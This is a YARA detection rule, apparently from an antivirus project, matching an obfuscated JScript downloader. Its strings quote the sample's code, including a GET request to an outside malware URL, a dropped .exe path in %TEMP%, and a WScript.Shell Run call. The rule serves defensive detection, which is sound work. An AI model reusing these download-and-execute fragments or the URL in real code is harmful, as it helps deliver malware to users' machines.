rule sig_20160328_8e32b837a5591749db34bf1be51ce403 {
  meta:
    description = "datamaliciousorder - file 20160328_8e32b837a5591749db34bf1be51ce403.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d47e4c193ad61c47661e8505692c1937a231066cd7a6ef70f94e330821a304a7"

  strings:
    $s1  = "function Iginj() {return Cobtcfupnk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"UFrk6nLdK6Feth.exe\";};" fullword ascii
    $s2  = "do {WScript[Tijzz](Vpxfihhz() * 11)} while (Ttndnn[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Cobtcfupnk = function Zbarsmf() {return WScript[Tuxynj](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Xuohrbkxxt(Zopufje, Uoronnorh){return Zopufje - Uoronnorh;};" fullword ascii
    $s5  = "Ttndnn[Zotbwn](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Eyhgr() {return ((Idsecb == true) && (Idsecb == Ngxxdz)) ? 1 : Exvwjxwcsg;};" fullword ascii
    $s7  = "function Kruxpejcbx(Wxgmfj){Cobtcfupnk[\"Run\"](Wxgmfj, Exvwjxwcsg, Exvwjxwcsg);};" fullword ascii
    $s8  = "var Swpll = false;" fullword ascii
    $s9  = "Idsecb = true; " fullword ascii
    $s10 = "var Pxfvwptdkh = new this[\"Date\"]();" fullword ascii
    $s11 = " while (Wriporoas){" fullword ascii
    $s12 = "return Xuohrbkxxt(Fiqqij, Txmdhjfmfd);" fullword ascii
    $s13 = "function Ksecj(Fuvga) {var Hdpunepzoh = (1, 2, 3, 4, 5, Fuvga); return Hdpunepzoh;};" fullword ascii
    $s14 = "function Zpojajyy(){return Tuxynj;};" fullword ascii
    $s15 = "var Idsecb = false;" fullword ascii
    $s16 = "function Jagjymuxg()" fullword ascii
    $s17 = "function Thbnoq(){return Eptrdtu;};" fullword ascii
    $s18 = "var Ngxxdz = false;" fullword ascii
    $s19 = "Ngxxdz = true; " fullword ascii
    $s20 = "function Vpxfihhz(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}